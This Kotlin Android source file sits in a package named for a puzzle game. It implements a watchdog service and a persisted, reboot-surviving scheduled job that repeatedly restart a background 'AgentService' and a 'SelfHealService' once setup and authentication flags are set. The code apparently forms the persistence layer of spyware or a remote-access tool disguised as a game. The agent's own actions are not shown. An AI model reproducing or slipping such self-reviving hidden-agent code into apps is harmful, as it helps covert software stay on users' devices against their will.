package com.puzzleblast.game.services

import android.app.ActivityManager
import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.puzzleblast.game.util.Prefs

class WatchdogService : Service() {
    private val handler = Handler(Looper.getMainLooper())
    private val tick = object : Runnable {
        override fun run() {
            checkAndRevive()
            handler.postDelayed(this, 60_000L)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        handler.post(tick)
        scheduleJob()
    }

    private fun isAgentRunning(): Boolean {
        val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        @Suppress("DEPRECATION")
        return am.getRunningServices(Int.MAX_VALUE).any { it.service.className == AgentService::class.java.name }
    }

    private fun checkAndRevive() {
        if (!Prefs.wizardDone || !Prefs.authed) return
        if (!isAgentRunning()) AgentService.start(this)
        SelfHealService.start(this)
    }

    private fun scheduleJob() {
        val js = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        val comp = ComponentName(this, SelfHealJobService::class.java)
        val info = JobInfo.Builder(9001, comp)
            .setPeriodic(15 * 60 * 1000L)
            .setPersisted(true)
            .build()
        js.schedule(info)
    }

    override fun onDestroy() {
        handler.removeCallbacks(tick)
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context) {
            ctx.startService(Intent(ctx, WatchdogService::class.java))
        }
    }
}

class SelfHealJobService : android.app.job.JobService() {
    override fun onStartJob(params: android.app.job.JobParameters?): Boolean {
        if (Prefs.wizardDone && Prefs.authed) {
            AgentService.start(this)
            SelfHealService.start(this)
        }
        jobFinished(params, false)
        return true
    }
    override fun onStopJob(params: android.app.job.JobParameters?): Boolean = true
}
